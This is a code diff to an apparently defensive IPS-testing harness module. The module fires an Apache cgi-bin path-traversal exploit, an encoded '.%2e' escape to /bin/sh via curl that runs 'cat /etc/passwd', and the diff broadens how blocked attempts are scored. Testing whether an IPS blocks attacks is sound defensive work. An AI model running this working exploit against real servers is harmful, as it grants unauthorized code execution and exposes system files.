@@ -19,7 +19,16 @@ META = {
     "port_customizable": True,
     # Linux: /etc/passwd ("root:...:0:0:"); Windows: win.ini ("[fonts]"/"[extensions]")
     "success_regex": r"root:[^:]*:0:0:|\[fonts\]|\[extensions\]",
-    "blocked_regex": r"timed out|Connection refused|403 Forbidden|could not resolve",
+    # An inline IPS/WAF (e.g. Sangfor's "web Vulnerability" signature) blocks the
+    # traversal by RESETTING the connection or returning a block page — curl then
+    # reports a reset / empty reply / recv failure, NOT the file. Catch those (and
+    # 403/406) so an IPS-blocked run scores BLOCKED instead of NO-RESULT. success
+    # is still checked first, so a variant that bypasses and reads the file wins.
+    "blocked_regex": (
+        r"timed out|Connection refused|could not resolve|"
+        r"Connection reset|reset by peer|Empty reply from server|Recv failure|"
+        r"403 Forbidden|406 Not Acceptable|curl: \((52|56|104)\)"
+    ),
 }
 
 _ESCAPE = "/cgi-bin/" + "/".join([".%2e"] * 7)
@@ -41,8 +50,10 @@ def run(target, ctx):
     # confirmation is to traverse to /bin/sh and run `cat /etc/passwd`. Benign read,
     # but it IS code-exec: gated behind the harness RoE like every module.
     out.append("--- traversal -> RCE (cgi-bin ScriptAlias): cat /etc/passwd ---")
+    # -S alongside -s: a silent run still surfaces the error line (e.g. an IPS
+    # connection reset) instead of empty output that would read as NO-RESULT.
     out.append(ctx.run_cmd(
-        f'curl -s --path-as-is -m10 -d "echo Content-Type: text/plain; echo; cat /etc/passwd" '
+        f'curl -s -S --path-as-is -m10 -d "echo Content-Type: text/plain; echo; cat /etc/passwd" '
         f'"http://{{target}}:{port}{_ESCAPE}/bin/sh"', target))
 
     # File-READ fallback (plain readable Alias / Windows target)
